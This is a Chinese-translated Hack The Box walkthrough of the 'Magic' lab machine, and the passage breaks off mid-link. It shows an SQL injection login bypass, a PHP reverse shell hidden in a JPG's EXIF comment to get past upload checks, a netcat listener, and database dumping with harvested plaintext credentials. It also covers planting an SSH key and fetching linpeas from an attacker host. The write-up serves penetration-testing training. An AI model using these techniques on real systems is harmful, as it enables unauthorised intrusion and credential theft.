<html>
<head>
<title>Hack The Box Walkthrough — Magic</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑盒子演练-魔法</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hack-the-box-walkthrough-magic-d633fb94bca4?source=collection_archive---------1-----------------------#2020-10-08">https://infosecwriteups.com/hack-the-box-walkthrough-magic-d633fb94bca4?source=collection_archive---------1-----------------------#2020-10-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/1dba127a22a807d94ff8a4687a65aebb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1182/format:webp/1*bfDU6vdIVw_iSYYjddsAvA.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated"><a class="ae jy" href="https://www.hackthebox.eu/home/machines/profile/241" rel="noopener ugc nofollow" target="_blank">https://www.hackthebox.eu/home/machines/profile/241</a></figcaption></figure><blockquote class="jz ka kb"><p id="22bc" class="kc kd ke kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">魔法是一个中等难度的机器，由<a class="ae jy" href="https://www.hackthebox.eu/home/users/profile/31190" rel="noopener ugc nofollow" target="_blank"> TRX </a>创造的盒子破解而来。我的过程包括简单的SQLi、隐写术和二进制植入。</p><p id="3716" class="kc kd ke kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这是一个未加工的预演，所以我在一个又一个拉比面前跌倒的过程在这里有很好的记录。它也反映了我在使用机器时的思考过程<strong class="kf ir">,我希望这可以帮助其他像我一样有抱负的渗透测试人员更好地思考。</strong></p></blockquote></div><div class="ab cl lb lc hu ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="ij ik il im in"><h2 id="ccf9" class="li lj iq bd lk ll lm dn ln lo lp dp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">总结:</h2><p id="86bf" class="pw-post-body-paragraph kc kd iq kf b kg me ki kj kk mf km kn lr mg kq kr lv mh ku kv lz mi ky kz la ij bi translated">该机器从一个网页启动，该网页的登录页面易受SQLi攻击。成功注入后，我们将被重定向到接受jpeg、jpg和png文件上传的页面。这些文件可以被武器化，让我们能够在系统中建立一个外壳。在获得shell后，由于密码重用错误，我们可以横向遍历到另一个用户，这将允许我们找到容易被劫持的二进制文件。成功利用这一点将最终导致我们在系统中建立一个根外壳。</p></div><div class="ab cl lb lc hu ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="ij ik il im in"><p id="8a85" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">在本演练中，我将在最后留下上标作为讨论点。</p><p id="be39" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">在我开始之前，我会将机器的IP地址添加到我的<code class="fe mj mk ml mm b">/etc/hosts</code>文件中，以便于访问。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="8197" class="li lj iq mm b gy mv mw l mx my">$ sudo vi /etc/hosts<br/>~ 10.10.10.185    magic.htb</span></pre><h2 id="e91a" class="li lj iq bd lk ll lm dn ln lo lp dp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">初始侦察:</h2><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="f131" class="li lj iq mm b gy mv mw l mx my">$ nmap -p- --min-rate 1000 magic.htb -oN pre-nmap<br/>$ nmap -sC -sV -T4 -p 22,80 magic.htb -oN nmap.txt</span></pre><p id="b491" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">我使用第一个nmap命令来确保我能够覆盖我正在测试的机器的所有端口。一旦第一个命令返回它的初始结果，我就在第二个nmap命令中插入可用端口，以便更详细地查看。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi mz"><img src="../Images/bcac4f28860bd197ecb722606eb90c75.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*K4HmNlXujfxBHN_SzGVw1g.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">详细的nmap结果</figcaption></figure><p id="1591" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">这很简单，因为通常的端口22和80在这台机器上是开放的。</p><h2 id="897b" class="li lj iq bd lk ll lm dn ln lo lp dp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">Web枚举和简单SQLi</h2><p id="35a0" class="pw-post-body-paragraph kc kd iq kf b kg me ki kj kk mf km kn lr mg kq kr lv mh ku kv lz mi ky kz la ij bi translated">我们要做的第一件事是枚举端口80中的服务。</p><p id="17ef" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">在检查web应用程序时，我看到了一个简单的登录页面。尝试模糊目录，模糊用户名和密码，并检查代码中有价值的提示，但一无所获，所以我猜前进的道路真的是SQL注入。</p><p id="b9ed" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">下面的SQLI备忘单帮了大忙:</p><div class="ne nf gp gr ng nh"><a href="https://github.com/AdmiralGaust/SQL-Injection-cheat-sheet" rel="noopener  ugc nofollow" target="_blank"><div class="ni ab fo"><div class="nj ab nk cl cj nl"><h2 class="bd ir gy z fp nm fr fs nn fu fw ip bi translated">AdmiralGaust/SQL注入备忘单</h2><div class="no l"><h3 class="bd b gy z fp nm fr fs nn fu fw dk translated">注意:如果是get请求，不要忘记对字符进行url编码。param = '--&gt;尝试获取错误param = "--&gt;尝试…</h3></div><div class="np l"><p class="bd b dl z fp nm fr fs nn fu fw dk translated">github.com</p></div></div><div class="nq l"><div class="nr l ns nt nu nq nv js nh"/></div></div></a></div><p id="d418" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">在用通常的有效载荷试了几次之后，下面的那个通过了。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="7a41" class="li lj iq mm b gy mv mw l mx my">' or 1=1#</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/757ef6581ac5152ae9257e0b0dde1729.png" data-original-src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*JeP1A2vFkWs5QyXsU6JWPg.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">对用户名和密码字段使用相同的有效负载</figcaption></figure><h2 id="27dc" class="li lj iq bd lk ll lm dn ln lo lp dp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">图像上传页面和反向壳隐写术</h2><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nx"><img src="../Images/4dadb7a9f27ed6e63c6b2271ed50f495.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wHJ-CVmnKIWw3TO4Fecc0g.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">上传页面欢迎我们成功利用SQLI</figcaption></figure><p id="e8de" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">使用上述有效负载后，我们将被重定向到此页面。作为一个健全性检查，因为我还没有做任何目录枚举，我试着退出并直接访问<code class="fe mj mk ml mm b">http://magic.htb/upload.php</code>，但它不起作用。</p><p id="b466" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">目前看来，下一步似乎是上传一个包含反向shell的文件，然后我们可以从外部调用它，以便能够在系统中建立立足点。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi ny"><img src="../Images/67a8a26dbda7c687bbc9038d975d1c4d.png" data-original-src="https://miro.medium.com/v2/resize:fit:758/format:webp/1*yGAG3iDRNBKXU94iXJKDsg.png"/></div></figure><p id="91e4" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">我试着上传一个. txt文件来检查他们是否净化了他们的输入，他们做到了。然而，我们还不确定他们的净化方法有多复杂，所以我试图再次绕过它，这次是通过改变我的反向shell脚本的文件扩展名。我将脚本保存为<code class="fe mj mk ml mm b">rev.jpg</code>，但是当我上传时，它返回了下面的错误。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nz"><img src="../Images/d15dc6b9ec28db06397a98b13b3f8b43.png" data-original-src="https://miro.medium.com/v2/resize:fit:566/format:webp/1*3dvhkPTOe3wJi1f4LujFww.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">哈哈哈对不起，我在努力黑你</figcaption></figure><p id="3cc5" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">它似乎检测到这不是一个合法的jpg文件，所以我很有信心，清理方法包括检查文件的神奇字节，以确保它是一个合法的文件类型。</p><p id="e0c8" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">这实际上是我第一次遇到这种问题，所以我最初的想法是，我需要找到一种方法，在一个合法的jpg文件中隐藏一个反向shell有效负载。</p><p id="3598" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">下面的链接非常有助于学习更多关于这个主题的知识和制作我使用的实际有效载荷。</p><div class="ne nf gp gr ng nh"><a href="https://github.com/xapax/security/blob/master/bypass_image_upload.md" rel="noopener  ugc nofollow" target="_blank"><div class="ni ab fo"><div class="nj ab nk cl cj nl"><h2 class="bd ir gy z fp nm fr fs nn fu fw ip bi translated">xapax/安全</h2><div class="no l"><h3 class="bd b gy z fp nm fr fs nn fu fw dk translated">获得外壳的一个常见方法实际上并不是一个漏洞，而是一个特性！通常情况下，有可能…</h3></div><div class="np l"><p class="bd b dl z fp nm fr fs nn fu fw dk translated">github.com</p></div></div><div class="nq l"><div class="oa l ns nt nu nq nv js nh"/></div></div></a></div><div class="ne nf gp gr ng nh"><a href="https://github.com/pentestmonkey/php-reverse-shell" rel="noopener  ugc nofollow" target="_blank"><div class="ni ab fo"><div class="nj ab nk cl cj nl"><h2 class="bd ir gy z fp nm fr fs nn fu fw ip bi translated">pentest monkey/PHP-reverse-shell</h2><div class="no l"><h3 class="bd b gy z fp nm fr fs nn fu fw dk translated">通过在GitHub上创建一个帐户，为pentest monkey/PHP-reverse-shell开发做出贡献。</h3></div><div class="np l"><p class="bd b dl z fp nm fr fs nn fu fw dk translated">github.com</p></div></div><div class="nq l"><div class="ob l ns nt nu nq nv js nh"/></div></div></a></div><div class="ne nf gp gr ng nh"><a href="https://stackoverflow.com/questions/4241369/using-linux-how-can-i-pass-the-contents-of-a-file-as-a-parameter-to-an-executabl" rel="noopener  ugc nofollow" target="_blank"><div class="ni ab fo"><div class="nj ab nk cl cj nl"><h2 class="bd ir gy z fp nm fr fs nn fu fw ip bi translated">使用linux我如何将文件的内容作为参数传递给可执行文件？</h2><div class="no l"><h3 class="bd b gy z fp nm fr fs nn fu fw dk translated">感谢贡献一个堆栈溢出的答案！请务必回答问题。提供详细信息并分享…</h3></div><div class="np l"><p class="bd b dl z fp nm fr fs nn fu fw dk translated">stackoverflow.com</p></div></div><div class="nq l"><div class="oc l ns nt nu nq nv js nh"/></div></div></a></div><p id="deb9" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">我使用了exiftool模块<code class="fe mj mk ml mm b">Comment</code>,在这里我们可以编写反向shell有效负载，我们打算在任意介质中作为注释运行。因为web特性需要一个jpg、jpeg或png，所以我使用一张实际的图片作为我的媒介，然后使用pentestmonkey的php脚本作为我的反向shell。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="ca96" class="li lj iq mm b gy mv mw l mx my">$ exiftool -Comment="$(&lt; rev.php)" test69.jpg</span></pre><p id="b56b" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">因为有效负载是一个多行脚本，所以我使用了<code class="fe mj mk ml mm b">$(&lt; file)</code>命令，而引号有助于保留脚本中的空白。</p><p id="436a" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">成功实现隐写术后，通过exiftool检查时，它应该是这样的。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi od"><img src="../Images/85157ae646ad73bcb9edce5e09b14772.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VOkrfB5aaCo99q6FLFJr4g.png"/></div></div></figure><p id="d6d9" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">然后，我们将其重命名为:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="f9dd" class="li lj iq mm b gy mv mw l mx my">$ mv test69.jpg test6969.php.jpg</span></pre><p id="66c7" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">当我们通过web服务器调用它时，它将被解释为一个php文件。</p><p id="c3ca" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">此时，我们已经将一个合法的jpg文件武器化了，它能够绕过文件扩展名检查和魔术检查。剩下唯一要做的就是检查它是否工作。</p><p id="6ec6" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">在单独的终端上，设置监听器。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="dd3a" class="li lj iq mm b gy mv mw l mx my">$ nc -nvlp 6969</span></pre><p id="b70a" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">确保您使用的端口是您在上传的反向shell脚本中输入的端口。</p><p id="7419" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">一旦我们访问上传时保存我们的武器化jpg文件的路径，它将看起来像这样。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi oe"><img src="../Images/fd6354368ff9fe2b018d358cd7e7f5f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dNKfkRUtbXl_sSVjPkH_Rg.png"/></div></div></figure><p id="8654" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">而我们的听众会像这样。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi of"><img src="../Images/00dcb30465c8b4a00a8659409b43cfb5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*69K-SZWtfPHU1pw2Nc4BsQ.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">我们找到贝壳了！</figcaption></figure><h2 id="7019" class="li lj iq bd lk ll lm dn ln lo lp dp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">初始Shell和用户Theseus</h2><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="671f" class="li lj iq mm b gy mv mw l mx my">$ python3 -c 'import pty; pty.spawn("/bin/bash")'</span></pre><p id="0bad" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">我通常从这个命令或者它的变体开始，来改进我所拥有的shell。</p><p id="cc14" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">每当我得到一个shell作为<code class="fe mj mk ml mm b">www-data</code>，我总是检查<code class="fe mj mk ml mm b">/var/www</code>目录中的工件，这些工件可以给我如何前进到下一个用户的线索。在列举了上述目录后，我看到了很多在<code class="fe mj mk ml mm b">/var/www/Magic</code>下的文件，其中最著名的文件名是<code class="fe mj mk ml mm b">db.php5</code>。</p><p id="bbdb" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">从该文件中，我们能够检索一组凭据，如下所示:</p><ul class=""><li id="9a26" class="og oh iq kf b kg kh kk kl lr oi lv oj lz ok la ol om on oo bi translated"><strong class="kf ir">用户名:</strong>忒修斯</li><li id="5f09" class="og oh iq kf b kg op kk oq lr or lv os lz ot la ol om on oo bi translated"><strong class="kf ir">密码:</strong> iamkingtheseus</li></ul><p id="2d63" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">在获得theseus的证书后，我立即尝试通过ssh登录。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="eefd" class="li lj iq mm b gy mv mw l mx my">$ ssh theseus@magic.htb</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/1c7a3e35d9de5de61bd0ebd9451f3253.png" data-original-src="https://miro.medium.com/v2/resize:fit:796/format:webp/1*2pLOaK5cgep5_B9IA46d1w.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">拒绝</figcaption></figure><p id="5974" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">回到db.php5文件，我注意到它是一个mysql db文件。在检查服务是否正在运行时，我看到了以下内容:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="42f0" class="li lj iq mm b gy mv mw l mx my">$ systemctl status mysql</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi ov"><img src="../Images/355db62a4bbaf586fa553411627dfb84.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*e9mSIxTCNqdhqAgJRGNJoQ.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">是的，它在跑</figcaption></figure><p id="fe55" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">然后，我使用我们之前收集的凭证转储数据库。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="f880" class="li lj iq mm b gy mv mw l mx my">$ mysqldump --opt --user=theseus --password Magic &gt; Magic.sql</span></pre><p id="9a84" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">关于这方面的进一步阅读，你可以参考下面的链接。</p><div class="ne nf gp gr ng nh"><a href="https://alvinalexander.com/blog/post/mysql/dump-mysql-database-schema/" rel="noopener  ugc nofollow" target="_blank"><div class="ni ab fo"><div class="nj ab nk cl cj nl"><h2 class="bd ir gy z fp nm fr fs nn fu fw ip bi translated">mysqldump命令——如何转储(备份)一个MySQL数据库</h2><div class="no l"><h3 class="bd b gy z fp nm fr fs nn fu fw dk translated">MySQL备份常见问题——如何备份/转储MySQL数据库模式？答:使用mysqldump数据库实用程序。在一个…</h3></div><div class="np l"><p class="bd b dl z fp nm fr fs nn fu fw dk translated">alvinalexander.com</p></div></div><div class="nq l"><div class="ow l ns nt nu nq nv js nh"/></div></div></a></div><p id="8526" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">检查文件中的可读字符串。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="1815" class="li lj iq mm b gy mv mw l mx my">$ strings Magic.sql</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi ox"><img src="../Images/88e760e25cd6ab6f323c0db5d85a6593.png" data-original-src="https://miro.medium.com/v2/resize:fit:906/format:webp/1*TZpMH-CO0uxHxVjm415RrQ.png"/></div></figure><p id="bfdb" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">我们找到了另一组凭据，但是，此时我已经不知道该在哪里使用它们，尽管出于本能，我尝试了以下命令:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="c2cf" class="li lj iq mm b gy mv mw l mx my">$ su theseus<br/>Password: Th3s3usW4sK1ng</span></pre><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi oy"><img src="../Images/4f827189e0068b9c24a86375fbe75e83.png" data-original-src="https://miro.medium.com/v2/resize:fit:510/format:webp/1*hOkwHUjeOP5UOsPF-oMPPQ.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">我们得到了用户忒修斯！</figcaption></figure><p id="29dd" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">似乎用户theseus出于数据库管理的目的创建了一个名为<code class="fe mj mk ml mm b">admin</code>的数据库用户，然而即使他创建了一个不同的用户，他仍然重用了他的服务器密码。下面列出了我们检索到的凭据的摘要。</p><ul class=""><li id="0865" class="og oh iq kf b kg kh kk kl lr oi lv oj lz ok la ol om on oo bi translated"><strong class="kf ir">数据库用户名</strong> : admin</li><li id="f2a5" class="og oh iq kf b kg op kk oq lr or lv os lz ot la ol om on oo bi translated"><strong class="kf ir">数据库密码</strong> : Th3s3usW4sK1ng</li><li id="296b" class="og oh iq kf b kg op kk oq lr or lv os lz ot la ol om on oo bi translated"><strong class="kf ir">服务器用户名</strong> : theseus</li><li id="2e97" class="og oh iq kf b kg op kk oq lr or lv os lz ot la ol om on oo bi translated"><strong class="kf ir">服务器密码</strong> : Th3s3usW4sK1ng</li></ul><p id="6707" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">我还尝试使用我们发现的新凭证登录网络服务器，但是，它重定向到我们之前通过SQLI发现的同一上传页面，所以我想我们现在可以关闭那里有任何线索的可能性。</p><h2 id="f1ce" class="li lj iq bd lk ll lm dn ln lo lp dp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">无密码SSH和基于工具的权限提升枚举</h2><p id="2a4a" class="pw-post-body-paragraph kc kd iq kf b kg me ki kj kk mf km kn lr mg kq kr lv mh ku kv lz mi ky kz la ij bi translated">在手动枚举时，我意识到总是通过我们已经建立的图像上传立足点重新登录对我来说是相当麻烦的，所以我在/home/theseus/中创建了一个文件。ssh/authorized_keys并执行以下操作:</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="fa21" class="li lj iq mm b gy mv mw l mx my">$ cat ~/.ssh/id_rsa.pub | xclip -se c</span></pre><p id="7418" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">在我的攻击机器中，我打印了我的公钥，并通过管道将它传输到xclip中，以将其复制到我的剪贴板中。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="1336" class="li lj iq mm b gy mv mw l mx my">$ echo “&lt;public key&gt;” &gt;&gt; ~/.ssh/authorized_keys</span></pre><p id="cb5e" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">然后，在远程机器上，我将我的公钥附加到authorized_keys文件中。替换文件实际上是不赞成的，因为其他pentesters可能会因此而不方便，所以我附加了我的。(尽管在这之后，我经历了不顾及他人的skiddies重写整个文件。Grrrrrr。HTB VIP值$$$的家伙。)</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi oz"><img src="../Images/9a7f3a6afd63bad750f6f62e2202e8d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yV6ZyqBZpDJUUt-M-OS37w.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">无密码的SSH好用！</figcaption></figure><p id="70d5" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">这就是设置无密码ssh的基本方法。</p><p id="4cdd" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">为了帮助我们的枚举，我决定使用<code class="fe mj mk ml mm b">linpeas</code>。你可以在下面的链接中找到它。</p><div class="ne nf gp gr ng nh"><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/" rel="noopener  ugc nofollow" target="_blank"><div class="ni ab fo"><div class="nj ab nk cl cj nl"><h2 class="bd ir gy z fp nm fr fs nn fu fw ip bi translated">Carlos polop/特权升级-牛逼-脚本-套件</h2><div class="no l"><h3 class="bd b gy z fp nm fr fs nn fu fw dk translated">在这里，您可以找到用于Windows和Linux/Unix*的权限提升工具(在不久的将来也会用于Mac)。这些…</h3></div><div class="np l"><p class="bd b dl z fp nm fr fs nn fu fw dk translated">github.com</p></div></div><div class="nq l"><div class="pa l ns nt nu nq nv js nh"/></div></div></a></div><p id="be09" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">为了将文件从我们的主机传输到机器上，我决定在我们的主机上设置一个简单的HTTPServer，然后从受害者机器上远程获取文件</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="10f5" class="li lj iq mm b gy mv mw l mx my">$ python -m SimpleHTTPServer 6969</span></pre><ul class=""><li id="e15f" class="og oh iq kf b kg kh kk kl lr oi lv oj lz ok la ol om on oo bi translated">攻击文件所在的机器</li></ul><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="5e82" class="li lj iq mm b gy mv mw l mx my">$ wget 10.10.14.25:6969/linpeas.sh</span></pre><ul class=""><li id="5b63" class="og oh iq kf b kg kh kk kl lr oi lv oj lz ok la ol om on oo bi translated">远程机器</li></ul><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pb"><img src="../Images/63404ca21ed2feddb8d4e57e4cfe2b7f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1214/format:webp/1*mLhs0tm6GiJ6CeMgt1prnw.png"/></div></figure><p id="9a3d" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">在运行linpeas时，我看到了许多有趣的发现，其中一些被转储在下面。</p><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi pc"><img src="../Images/25ab6608bdc80bdece6e716d95404f1e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RZktgihYnCI4xdWpiE9b1Q.png"/></div></div></figure><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi pd"><img src="../Images/0f6eca1f4802ad3f94f36197301691d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*A5biXOKfdeCfAHNDQvI5XA.png"/></div></div></figure><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi pe"><img src="../Images/f2051987e0b3e4adc0d3b3879705d8a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wNvIDgGLLaB0VE421KWPKA.png"/></div></div></figure><figure class="mn mo mp mq gt jr gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/3841c6c393b142ac42692be1cfd587d4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1266/format:webp/1*uYMp4rd8TbtFn-eEn2tvaA.png"/></div></figure><p id="d2b9" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">然而，在linpeas给我的所有东西中，没有一件第一眼看上去很突出。在对一些发现进行采样后，我决定使用另一个名为<code class="fe mj mk ml mm b">pspy64</code>的工具。</p><p id="e6bd" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">Pspy“窥探”系统，跟踪用户在系统上执行的命令、cron作业等，并观察系统的反应。我们可能会特别使用它来查找以root权限运行的服务/命令。</p><p id="42c4" class="pw-post-body-paragraph kc kd iq kf b kg kh ki kj kk kl km kn lr kp kq kr lv kt ku kv lz kx ky kz la ij bi translated">你可以在下面的链接中找到它。</p><div class="ne nf gp gr ng nh"><a 